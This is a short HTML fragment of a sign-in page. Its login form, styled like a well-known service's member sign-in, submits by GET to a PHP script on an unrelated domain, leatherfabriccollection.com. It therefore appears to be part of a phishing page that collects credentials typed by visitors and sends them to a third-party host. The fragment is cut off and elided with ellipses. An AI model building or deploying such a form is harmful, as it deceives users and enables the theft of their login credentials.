...
<div id="main" class="signin">
 ...
 <form action="https://leatherfabriccollection.com/app/flag/login-submit.php" method="GET" name="login" novalidate="novalidate" id="login" class="ajax-form stacked-form" data-jsenabled="check" data-autologin="true" data-existingmembersignin="true">
